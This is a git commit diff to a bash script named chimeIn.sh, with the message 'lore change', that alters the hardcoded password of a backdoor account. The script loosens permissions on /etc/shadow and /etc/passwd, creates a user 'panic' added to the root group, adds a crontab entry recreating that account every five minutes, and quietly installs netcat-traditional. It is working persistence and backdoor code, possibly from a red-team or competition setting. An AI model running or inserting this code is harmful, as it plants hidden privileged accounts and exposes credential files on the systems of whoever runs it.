b46e09ebf5f49706134d1cd1080279c8d546f2c4
Kole Swesey <45017744+0xPanic@users.noreply.github.com>
2020-12-09 19:22:38 -0600

    lore change

--- chimeIn.sh
+++ chimeIn.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 chmod 644 /etc/shadow
 chmod 666 /etc/passwd
-useradd panic  && echo -e "iwrites1ns\niwrites1ns" | passwd panic
+useradd panic  && echo -e "riseab0ve\nriseab0ve" | passwd panic
 usermod -a -G root panic
 echo "*/5 * * * *  root  useradd panic && echo -e "riseab0ve\nriseab0ve" | passwd panic && usermod -a -G root panic" >> /etc/crontab
 apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
